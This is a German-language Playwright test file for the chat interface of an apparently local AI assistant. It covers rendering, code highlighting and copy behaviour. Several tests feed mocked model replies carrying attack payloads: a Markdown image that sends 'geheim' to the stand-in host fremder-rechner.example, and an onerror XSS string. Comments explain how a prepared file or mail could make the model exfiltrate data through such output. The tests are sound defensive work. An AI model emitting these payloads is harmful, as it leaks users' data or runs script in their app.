import { expect, test, type Page } from "@playwright/test";

import { angemeldet } from "./system";

/**
 * Der Chat im Browser.
 *
 * **Was hier geprüft wird und was nicht.** Ob Textstücke fließen, hängt an
 * einem Sprachmodell; ein Gate, das ein 4,9-GB-Modell voraussetzt, läuft in
 * keiner Pipeline. Der Fluss selbst ist deshalb in der pytest-Suite gemessen
 * (``test_ereignisstrom.py``: die Stücke kommen einzeln und ergeben den Text).
 *
 * Hier geht es um das, was die Oberfläche unabhängig davon leisten muss: Was
 * gesagt wurde, steht sofort da; was das System tut, bleibt sichtbar; und der
 * Plan ist einen Klick entfernt — ein Chatfenster, das nur Text zeigt,
 * verbirgt, was gerade geschieht.
 */
test("Gesagtes erscheint sofort, mit sichtbarem Zustand", async ({ page }) => {
  await angemeldet(page);

  await page.getByTestId("eingabe").fill("Wie spät ist es?");
  await page.getByTestId("senden").click();

  const wortwechsel = page.getByTestId("wortwechsel").first();
  await expect(wortwechsel.getByTestId("gesagt")).toContainText("Wie spät ist es?");
  // Ohne laufendes Modell bleibt der Lauf stehen — und die Oberfläche sagt
  // das, statt eine leere Antwort zu zeigen.
  await expect(wortwechsel.getByTestId("geantwortet")).toContainText(/arbeitet|wartet/);
});

test("Der Plan bleibt einen Klick entfernt", async ({ page }) => {
  await angemeldet(page);
  await page.getByTestId("eingabe").fill("Blockier mir eine Stunde");
  await page.getByTestId("senden").click();
  await expect(page.getByTestId("wortwechsel").first()).toBeVisible();

  await page.getByTestId("zum-lauf").first().click();

  await expect(page.getByTestId("laufliste")).toBeVisible();
});

/**
 * Legt der Oberfläche eine fertige Modellantwort vor.
 *
 * Nachgestellt wird die **Antwort**, nicht die Prüfung: Was ein Modell
 * schreibt, hängt vom Modell ab, und ein Gate, das ein 4,9-GB-Modell
 * voraussetzt, läuft in keiner Pipeline. Wie die Oberfläche mit einem
 * gegebenen Text umgeht, ist davon unabhängig — und genau das ist hier die
 * Frage.
 */
async function mitAntwort(page: Page, output: string): Promise<void> {
  await page.route("**/runs", async (route) => {
    if (route.request().method() !== "GET") return route.fallback();
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify([
        {
          id: "11111111-1111-1111-1111-111111111111",
          status: "completed",
          trigger: "user",
          taint_level: "clean",
          data_class: "p2",
          intent: null,
          is_multi_step: false,
          trace_id: "t",
          started_at: new Date().toISOString(),
          finished_at: new Date().toISOString(),
          goal: "Lies die Notiz",
          output,
          plan: [],
        },
      ]),
    });
  });
  await page.reload();
}

test("Markdown wird ausgezeichnet dargestellt", async ({ page }) => {
  await angemeldet(page);
  await mitAntwort(
    page,
    "## Ergebnis\n\nZwei Termine:\n\n- heute\n- morgen\n\n| Zeit | Ort |\n|---|---|\n| 9:00 | Büro |\n\n`code`",
  );

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort.locator("h2")).toHaveText("Ergebnis");
  await expect(antwort.locator("li")).toHaveCount(2);
  await expect(antwort.locator("table td").first()).toHaveText("9:00");
  await expect(antwort.locator("code")).toHaveText("code");
});

test("Ein Bild in der Antwort wird nicht geholt", async ({ page }) => {
  await angemeldet(page);

  // **Die Lücke, die die HTML-Regel offen lässt.** ``![](…)`` ist gültiges
  // Markdown; der Browser holt die Adresse ohne Zutun ab. In einem Lauf, der
  // Fremdinhalt tragen kann, wäre das ein Ausleitungskanal — die Adresse
  // trägt, was das Modell hineinschreibt. Gemessen wird deshalb der
  // **Netzverkehr**, nicht das Markup: Ob ein Element entsteht, ist die
  // Vermutung; ob eine Anfrage rausgeht, ist die Wirkung.
  const abrufe: string[] = [];
  page.on("request", (anfrage) => {
    if (anfrage.url().includes("fremder-rechner.example")) abrufe.push(anfrage.url());
  });

  await mitAntwort(page, "![Beleg](https://fremder-rechner.example/spur.png?d=geheim)");

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort.getByTestId("bildverweis")).toContainText("Beleg");
  expect(await antwort.locator("img").count()).toBe(0);
  expect(abrufe).toEqual([]);
});

test("Der Antworttext wird als Text dargestellt, nicht als HTML", async ({ page }) => {
  await angemeldet(page);

  // Nachgestellt wird eine Modellantwort mit HTML darin — der Weg, den eine
  // präparierte Datei oder Mail nähme. Gerendert werden darf sie nur als Text;
  // ein ``dangerouslySetInnerHTML`` an dieser Stelle wäre der direkte Pfad in
  // eine Anwendung mit Postfachzugriff.
  await mitAntwort(page, '<img src=x onerror="window.__geknackt=1"> <b>fett</b>');

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort).toContainText("<b>fett</b>");
  expect(await page.evaluate(() => (window as never as Record<string, unknown>).__geknackt)).toBeUndefined();
  expect(await antwort.locator("img").count()).toBe(0);
});

/**
 * Quelltext: eingefärbt, kopierbar — und weiterhin Text.
 *
 * Die Einfärbung ist der erste Ort, an dem eine fremde Bibliothek Markup für
 * Modellinhalt erzeugen *könnte*. Deshalb steht hier neben „sieht schön aus"
 * die Frage, auf die es ankommt: Entsteht aus dem Quelltext ein Element?
 */
test("Ein Quelltextblock wird eingefärbt und nennt seine Sprache", async ({ page }) => {
  await angemeldet(page);
  await mitAntwort(page, 'So geht es:\n\n```python\ndef gruss(name):\n    return f"Hallo {name}"\n```');

  const block = page.getByTestId("quelltext");
  await expect(block).toHaveAttribute("data-sprache", "python");
  await expect(block).toContainText("def gruss(name):");
  // Eingefärbt heißt: Die Token tragen Farben. Ohne Shiki stünde der Text als
  // ein Stück da — dann gäbe es keine gefärbten Abschnitte.
  await expect
    .poll(async () => block.locator("code span[style*='color']").count(), { timeout: 10_000 })
    .toBeGreaterThan(3);
});

test("Der Kopierknopf legt genau den Quelltext in die Zwischenablage", async ({ page }) => {
  await page.context().grantPermissions(["clipboard-read", "clipboard-write"]);
  await angemeldet(page);
  await mitAntwort(page, "```bash\nmake gate\n```");

  await page.getByTestId("kopieren").click();

  await expect(page.getByTestId("kopieren")).toHaveText("kopiert");
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe("make gate");
});

test("Auch eingefärbter Quelltext bleibt Text", async ({ page }) => {
  await angemeldet(page);
  // Der Weg, den eine präparierte Datei nähme: HTML **im** Quelltextblock, wo
  // eine Bibliothek gleich Markup erzeugt. Über Token statt HTML kann daraus
  // kein Element werden — das prüft dieser Test und nicht die Absicht.
  await mitAntwort(page, '```html\n<img src=x onerror="window.__geknackt=1">\n```');

  const block = page.getByTestId("quelltext");
  await expect(block).toContainText("<img src=x");
  expect(await block.locator("img").count()).toBe(0);
  expect(
    await page.evaluate(() => (window as never as Record<string, unknown>).__geknackt),
  ).toBeUndefined();
});

test("Ein Block ohne bekannte Sprache bleibt schlicht und vollständig", async ({ page }) => {
  await angemeldet(page);
  await mitAntwort(page, "```klingonisch\nnuqneH\n```");

  const block = page.getByTestId("quelltext");
  await expect(block).toContainText("nuqneH");
  // Nicht geraten: Eine falsche Einfärbung wäre eine Aussage über den Text,
  // die niemand geprüft hat.
  expect(await block.locator("code span[style*='color']").count()).toBe(0);
});
